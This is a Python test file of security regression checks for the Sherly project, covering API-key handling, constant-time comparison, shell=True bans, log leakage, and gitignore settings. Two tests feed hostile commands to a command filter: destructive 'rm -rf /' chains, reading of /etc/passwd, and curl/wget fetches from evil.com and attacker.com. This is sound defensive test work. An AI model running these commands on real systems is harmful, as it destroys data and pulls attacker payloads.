"""
Security regression tests for the Sherly repository.

Covers:
  1.  Missing PVPORCUPINE_ACCESS_KEY raises RuntimeError
  2.  Missing SHERLY_REMOTE_API_KEY rejects all requests
  3.  Wrong SHERLY_REMOTE_API_KEY is rejected (403)
  4.  Correct SHERLY_REMOTE_API_KEY is accepted (200)
  5.  Authentication uses secrets.compare_digest
  6.  No hardcoded real credentials in source files
  7.  safe_exec() blocks shell operator chaining
  8.  safe_exec() rejects non-whitelisted commands
  9.  run_command() does not use shell=True (AST-level check)
  10. run_project() does not use shell=True (AST-level check)
  11. Credentials are not leaked to logs or stdout
  12. config.json is gitignored; .env.example is NOT gitignored
"""

from __future__ import annotations

import ast
import os
import subprocess
import sys
import textwrap
from pathlib import Path
from unittest.mock import patch

import pytest

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

REPO_ROOT = Path(__file__).parent.parent


def _ast_contains_shell_true(source_file: Path) -> bool:
    """Return True if the source file contains any subprocess call with shell=True."""
    tree = ast.parse(source_file.read_text(encoding="utf-8"))
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        for kw in node.keywords:
            if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True:
                return True
    return False


def _run_git(*args: str, cwd: Path = REPO_ROOT) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["git", *args],
        capture_output=True,
        text=True,
        cwd=cwd,
        check=False,
    )


# ---------------------------------------------------------------------------
# Test 1 — Missing PVPORCUPINE_ACCESS_KEY raises RuntimeError
# ---------------------------------------------------------------------------

def test_missing_pvporcupine_key_raises_runtime_error(monkeypatch):
    """WakeWordDetector must raise RuntimeError when PVPORCUPINE_ACCESS_KEY is absent."""
    monkeypatch.delenv("PVPORCUPINE_ACCESS_KEY", raising=False)

    # Import fresh inside the test to bypass module-level caching
    import importlib
    import sherly_core.wake_word as ww_mod
    importlib.reload(ww_mod)

    with pytest.raises(RuntimeError, match="PVPORCUPINE_ACCESS_KEY"):
        # Patch pvporcupine.create so we don't need the native library
        with patch("pvporcupine.create", side_effect=AssertionError("should not reach pvporcupine")):
            with patch("pyaudio.PyAudio"):
                ww_mod.WakeWordDetector()


# ---------------------------------------------------------------------------
# Test 2 — Missing SHERLY_REMOTE_API_KEY fails closed
# ---------------------------------------------------------------------------

def test_missing_remote_api_key_fails_closed(monkeypatch):
    """verify_key() must reject requests when SHERLY_REMOTE_API_KEY is not configured."""
    monkeypatch.delenv("SHERLY_REMOTE_API_KEY", raising=False)

    # Reload the module so it picks up the missing env var
    import importlib
    import remote_api.server as srv_mod
    importlib.reload(srv_mod)

    from fastapi import HTTPException

    with pytest.raises(HTTPException) as exc_info:
        srv_mod.verify_key(x_api_key="anything")
    assert exc_info.value.status_code == 403


# ---------------------------------------------------------------------------
# Test 3 — Wrong API key is rejected
# ---------------------------------------------------------------------------

def test_wrong_remote_api_key_rejected(monkeypatch):
    """verify_key() must reject an incorrect API key with 403."""
    monkeypatch.setenv("SHERLY_REMOTE_API_KEY", "correct_test_key_abc123")

    import importlib
    import remote_api.server as srv_mod
    importlib.reload(srv_mod)

    from fastapi import HTTPException

    with pytest.raises(HTTPException) as exc_info:
        srv_mod.verify_key(x_api_key="wrong_key")
    assert exc_info.value.status_code == 403


# ---------------------------------------------------------------------------
# Test 4 — Correct API key accepted
# ---------------------------------------------------------------------------

def test_correct_remote_api_key_accepted(monkeypatch):
    """verify_key() must return True when the correct API key is supplied."""
    monkeypatch.setenv("SHERLY_REMOTE_API_KEY", "correct_test_key_abc123")

    import importlib
    import remote_api.server as srv_mod
    importlib.reload(srv_mod)

    result = srv_mod.verify_key(x_api_key="correct_test_key_abc123")
    assert result is True


# ---------------------------------------------------------------------------
# Test 5 — Authentication uses secrets.compare_digest
# ---------------------------------------------------------------------------

def test_authentication_uses_compare_digest():
    """server.py must import and use secrets.compare_digest for key comparison."""
    server_src = (REPO_ROOT / "remote_api" / "server.py").read_text(encoding="utf-8")
    assert "secrets.compare_digest" in server_src, (
        "server.py must use secrets.compare_digest for constant-time comparison"
    )
    assert "import secrets" in server_src, (
        "server.py must import the secrets module"
    )


# ---------------------------------------------------------------------------
# Test 6 — No hardcoded real credentials in source files
# ---------------------------------------------------------------------------

KNOWN_PLACEHOLDER_VALUES = {
    "YOUR_OPENAI_KEY", "YOUR_GEMINI_KEY", "YOUR_GROQ_KEY",
    "your_openai_api_key_here", "your_gemini_api_key_here",
    "your_groq_api_key_here", "your_remote_api_key_here",
    "your_picovoice_access_key_here",
}

CREDENTIAL_PATTERNS_TO_REJECT = [
    "sherly123",
]

def test_no_hardcoded_credentials_in_source():
    """Scan Python source files for known hardcoded credential strings."""
    py_files = list(REPO_ROOT.rglob("*.py"))
    violations = []

    for f in py_files:
        # Skip venv, __pycache__, .git, node_modules, and test files
        # (test files legitimately reference pattern names as test data)
        parts = f.parts
        if any(skip in parts for skip in ("venv", "__pycache__", ".git", "node_modules", "tests")):
            continue
        try:
            text = f.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue
        for pattern in CREDENTIAL_PATTERNS_TO_REJECT:
            if pattern in text:
                violations.append(f"{f.relative_to(REPO_ROOT)}: contains '{pattern}'")

    assert not violations, "Hardcoded credentials found:\n" + "\n".join(violations)


# ---------------------------------------------------------------------------
# Test 7 — safe_exec() blocks shell chaining operators
# ---------------------------------------------------------------------------

def test_safe_exec_blocks_operator_chaining():
    """safe_exec() must block commands containing &, ;, |, or newline."""
    from tools.terminal_tools import safe_exec

    for bad_cmd in [
        "python --version & calc.exe",
        "echo hello; rm -rf /",
        "ls | cat /etc/passwd",
        "python\nrm -rf /",
    ]:
        result = safe_exec(bad_cmd)
        assert "Blocked" in result or "blocked" in result.lower(), (
            f"safe_exec should have blocked chaining in: {bad_cmd!r}"
        )


# ---------------------------------------------------------------------------
# Test 8 — safe_exec() rejects non-whitelisted commands
# ---------------------------------------------------------------------------

def test_safe_exec_rejects_non_whitelisted_commands():
    """safe_exec() must block commands not in the allowed prefix whitelist."""
    from tools.terminal_tools import safe_exec

    for bad_cmd in [
        "curl http://evil.com/payload",
        "powershell -Command rm /",
        "wget http://attacker.com/script",
        "rm -rf /home",
    ]:
        result = safe_exec(bad_cmd)
        assert "Blocked" in result or "blocked" in result.lower(), (
            f"safe_exec should have blocked non-whitelisted: {bad_cmd!r}"
        )


# ---------------------------------------------------------------------------
# Test 9 — run_command() does not use shell=True (AST check)
# ---------------------------------------------------------------------------

def test_run_command_does_not_use_shell_true():
    """terminal_tools.run_command() must not invoke subprocess with shell=True."""
    terminal_tools_path = REPO_ROOT / "tools" / "terminal_tools.py"
    assert not _ast_contains_shell_true(terminal_tools_path), (
        "tools/terminal_tools.py contains shell=True — this must be removed"
    )


# ---------------------------------------------------------------------------
# Test 10 — run_project() does not use shell=True (AST check)
# ---------------------------------------------------------------------------

def test_run_project_does_not_use_shell_true():
    """executor.run_project() must not invoke subprocess with shell=True."""
    executor_path = REPO_ROOT / "tools" / "executor.py"
    assert not _ast_contains_shell_true(executor_path), (
        "tools/executor.py contains shell=True — this must be removed"
    )


# ---------------------------------------------------------------------------
# Test 11 — Credentials not leaked to stdout/logs during auth
# ---------------------------------------------------------------------------

def test_credentials_not_logged_during_auth(monkeypatch, capsys):
    """verify_key() must not print or log the configured API key value."""
    test_secret = "TEST_SECRET_DO_NOT_LOG_xyz987"
    monkeypatch.setenv("SHERLY_REMOTE_API_KEY", test_secret)

    import importlib
    import remote_api.server as srv_mod
    importlib.reload(srv_mod)

    from fastapi import HTTPException

    # Try valid key
    srv_mod.verify_key(x_api_key=test_secret)

    # Try invalid key (rejected)
    try:
        srv_mod.verify_key(x_api_key="wrong")
    except HTTPException:
        pass

    captured = capsys.readouterr()
    assert test_secret not in captured.out, "API key was printed to stdout"
    assert test_secret not in captured.err, "API key was printed to stderr"


def test_pvporcupine_key_not_logged_in_wake_word_error(monkeypatch, capsys):
    """WakeWordDetector error message must not include the key value."""
    # When key IS set but pvporcupine fails, the error should not leak the key
    dummy_key = "dummy_picovoice_key_DO_NOT_LOG"
    monkeypatch.setenv("PVPORCUPINE_ACCESS_KEY", dummy_key)

    import importlib
    import sherly_core.wake_word as ww_mod
    importlib.reload(ww_mod)

    with patch("pvporcupine.create", side_effect=RuntimeError("invalid key")):
        with patch("pyaudio.PyAudio"):
            with pytest.raises(Exception):
                ww_mod.WakeWordDetector()

    captured = capsys.readouterr()
    assert dummy_key not in captured.out, "Picovoice key leaked to stdout"
    assert dummy_key not in captured.err, "Picovoice key leaked to stderr"


# ---------------------------------------------------------------------------
# Test 12 — config.json is gitignored; .env.example is NOT gitignored
# ---------------------------------------------------------------------------

def test_config_json_is_gitignored():
    """config.json must be covered by .gitignore to prevent accidental secret commits."""
    result = _run_git("check-ignore", "-v", "config.json")
    assert result.returncode == 0, (
        "config.json is NOT gitignored — this risks committing API keys written "
        "by config_manager.set_api_key(). Add 'config.json' to .gitignore."
    )


def test_env_example_is_not_gitignored():
    """.env.example must NOT be gitignored — it is the canonical setup reference."""
    result = _run_git("check-ignore", "-v", ".env.example")
    # check-ignore returns exit code 1 when the file is NOT ignored (correct state)
    assert result.returncode == 1, (
        ".env.example IS gitignored — it should be tracked as the setup reference."
    )


def test_env_example_is_tracked():
    """.env.example must be tracked in git."""
    result = _run_git("ls-files", ".env.example")
    assert ".env.example" in result.stdout, (
        ".env.example is not tracked by git"
    )
